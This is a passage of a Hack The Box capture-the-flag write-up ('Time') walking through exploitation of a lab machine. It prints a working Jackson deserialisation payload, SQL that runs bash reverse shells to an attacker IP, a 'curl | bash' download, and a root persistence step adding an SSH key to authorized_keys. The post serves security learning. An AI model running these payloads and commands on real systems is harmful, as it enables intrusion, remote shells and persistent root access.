</pre></table></code></div></div><p>The version of the system can be identified by searching for the <code class="language-plaintext highlighter-rouge">OpenSSH</code> package information. It appears to be <code class="language-plaintext highlighter-rouge">Ubuntu 20.04 (Focal Fossa)</code> according to the page below.</p><p><a href="https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.1">https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.1</a></p><h3 id="http">HTTP</h3><p>The following web page is found as the index page of the HTTP server, which appears to beautify and validate <code class="language-plaintext highlighter-rouge">JSON</code> data.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-time/http.jpg" alt="" /></p><p>An error message is obtained by trying some invalid <code class="language-plaintext highlighter-rouge">JSON</code> object with the “Validate” functionality. In the message, we notice that <code class="language-plaintext highlighter-rouge">com.fasterxml.jackson.core</code> is the package used to process the data.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN
</pre></table></code></div></div><h2 id="exploitation">Exploitation</h2><h3 id="cve-2019-12384">CVE-2019-12384</h3><p>The package has a lot of vulnerabilities. After quite a bit of searching and trial &amp; error, a working exploit is found in this <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">blog post</a>.</p><p>First, an <code class="language-plaintext highlighter-rouge">inject.sql</code> file containing the below contents is created and served with <code class="language-plaintext highlighter-rouge">Python</code> HTTP server.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">CREATE</span> <span class="k">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="k">AS</span> <span class="err">$$</span> <span class="n">String</span> <span class="n">shellexec</span><span class="p">(</span><span class="n">String</span> <span class="n">cmd</span><span class="p">)</span> <span class="n">throws</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span> <span class="err">{</span>
        <span class="n">String</span><span class="p">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="err">{</span><span class="nv">"bash"</span><span class="p">,</span> <span class="nv">"-c"</span><span class="p">,</span> <span class="n">cmd</span><span class="err">}</span><span class="p">;</span>
        <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">command</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">()).</span><span class="n">useDelimiter</span><span class="p">(</span><span class="nv">"</span><span class="se">\\</span><span class="nv">A"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">hasNext</span><span class="p">()</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="k">next</span><span class="p">()</span> <span class="p">:</span> <span class="nv">""</span><span class="p">;</span>  <span class="err">}</span>
<span class="err">$$</span><span class="p">;</span>
<span class="k">CALL</span> <span class="n">SHELLEXEC</span><span class="p">(</span><span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1'</span><span class="p">)</span>
</pre></table></code></div></div><p>Next, the following payload is used against the page’s “validate” function to trigger the deserialisation vulnerability, which in turn makes the server do an SSRF to fetch and execute our malicious SQL code.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.8:8000/inject.sql'"}]
</pre></table></code></div></div><p>It is confirmed in our <code class="language-plaintext highlighter-rouge">Python</code> HTTP server.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ python -m http.server       
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.214 - - [03/Apr/2021 23:49:14] "GET /inject.sql HTTP/1.1" 200 -
</pre></table></code></div></div><p>Checking the <code class="language-plaintext highlighter-rouge">ncat</code> listener, we get a reverse shell as <code class="language-plaintext highlighter-rouge">pericles</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$ ncat -nlvp 4444

...

pericles@time:/var/www/html$ whoami
whoami
pericles
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><p>Some enumeration is performed with <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">LinPEAS</a>. This can be done by putting the <code class="language-plaintext highlighter-rouge">linpeas.sh</code> in the <code class="language-plaintext highlighter-rouge">Python</code> HTTP server directory and execute the following command in the reverse shell.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pericles@time:/var/www/html$ curl 10.10.14.8:8000/linpeas.sh | bash
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">System timers</code> section of the outputs, something interesting is found. For some readings about <code class="language-plaintext highlighter-rouge">systemd</code> timers, refer to <a href="https://wiki.archlinux.org/index.php/Systemd/Timers">here</a>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                        LEFT         LAST                        PASSED        UNIT                         ACTIVATES
Sun 2021-04-04 03:53:11 UTC 2s left      Sun 2021-04-04 03:53:01 UTC 7s ago        timer_backup.timer           timer_backup.service
</pre></table></code></div></div><p>The timer is found to be executing a service named <code class="language-plaintext highlighter-rouge">timer_backup.service</code>, which in turn runs another service <code class="language-plaintext highlighter-rouge">web_backup.service</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>pericles@time:/var/www/html$ find / -name timer_backup.service 2&gt;/dev/null
/etc/systemd/system/timer_backup.service

pericles@time:/var/www/html$ cat /etc/systemd/system/timer_backup.service
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">web_backup.service</code> just runs a shell script <code class="language-plaintext highlighter-rouge">/usr/bin/timer_backup.sh</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>pericles@time:/var/www/html$ cat /etc/systemd/system/web_backup.service
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
</pre></table></code></div></div><p>The shell script does some backup job as the name suggests. However, by checking the permissions of the file, it is found to be owned by our current user and writable by anyone, which means that we can control the content of the script.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>pericles@time:/var/www/html$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip

pericles@time:/var/www/html$ ls -l /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 Apr  4 04:05 /usr/bin/timer_backup.sh
</pre></table></code></div></div><p>Since the script is executed by <code class="language-plaintext highlighter-rouge">systemd</code> and as <code class="language-plaintext highlighter-rouge">root</code>, we can simply put a reverse shell one-liner in it to get a reverse shell as <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pericles@time:/var/www/html$ echo 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1' &gt;&gt; /usr/bin/timer_backup.sh
</pre></table></code></div></div><p>It is confirmed by checking our <code class="language-plaintext highlighter-rouge">ncat</code> listener. But after a few seconds, the reverse shell dies, which makes it unusable.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$ ncat -nlvp 4444                                                                          

...

root@time:/# whoami
whoami
root
</pre></table></code></div></div><p>To get a stable shell, we can use <code class="language-plaintext highlighter-rouge">ssh</code>. First, an <code class="language-plaintext highlighter-rouge">ssh</code> key named <code class="language-plaintext highlighter-rouge">root</code> is generated with <code class="language-plaintext highlighter-rouge">ssh-keygen</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ ssh-keygen -t ed25519 -f root
</pre></table></code></div></div><p>Next, we put a command that writes our public key into root’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> in the shell script.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ cat root.pub                               
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7KYkSEthZfyCg4JkhAPAxW7bMlweV2iEvj9sSpUQjO

pericles@time:/var/www/html$ echo 'echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7KYkSEthZfyCg4JkhAPAxW7bMlweV2iEvj9sSpUQjO &gt;&gt; /root/.ssh/authorized_keys' &gt;&gt; /usr/bin/timer_backup.sh
</pre></table></code></div></div><p>After a few seconds, we can <code class="language-plaintext highlighter-rouge">ssh</code> in with the private key.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ ssh -i root root@10.10.10.214

...

root@time:~# whoami
root
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-write-ups/'>CTF Write-ups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/deserialisation/" class="post-tag no-text-decoration" >Deserialisation</a> <a href="/tags/java/" class="post-tag no-text-decoration" >Java</a> <a href="/tags/json/" class="post-tag no-text-decoration" >JSON</a> <a href="/tags/systemd/" class="post-tag no-text-decoration" >systemd</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB - Time - QTranspose&url=https://qtranspose.xyz/posts/htb-time/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Time - QTranspose&u=https://qtranspose.xyz/posts/htb-time/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Time - QTranspose&url=https://qtranspose.xyz/posts/htb-time/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-time/">HTB - Time</a><li><a href="/posts/htb-bankrobber/">HTB - Bankrobber</a><li><a href="/posts/htb-bounty/">HTB - Bounty</a><li><a href="/posts/htb-forest/">HTB - Forest</a><li><a href="/posts/htb-optimum/">HTB - Optimum</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/ssrf/">SSRF</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-ready/"><div class="card-body"> <span class="timeago small" > May 16 <i class="unloaded">2021-05-16T00:00:00+10:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Ready</h3><div class="text-muted small"><p> Ready is a vulnerable virtual machine created by bertolis on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan...</p></div></div></a></div><div class="card"> <a href="/posts/htb-optimum/"><div class="card-body"> <span class="timeago small" > Nov 16, 2020 <i class="unloaded">2020-11-16T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Optimum</h3><div class="text-muted small"><p> Optimum is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-bastard/"><div class="card-body"> <span class="timeago small" > Nov 28, 2020 <i class="unloaded">2020-11-28T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Bastard</h3><div class="text-muted small"><p> Bastard is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-bankrobber/" class="btn btn-outline-primary" prompt="Older"><p>HTB - Bankrobber</p></a> <a href="/posts/htb-ready/" class="btn btn-outline-primary" prompt="Newer"><p>HTB - Ready</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"></div><div class="footer-right"><p class="mb-0"> © 2021 <a href="https://github.com/QTranspose">QTranspose</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/ssrf/">SSRF</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://qtranspose.xyz{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
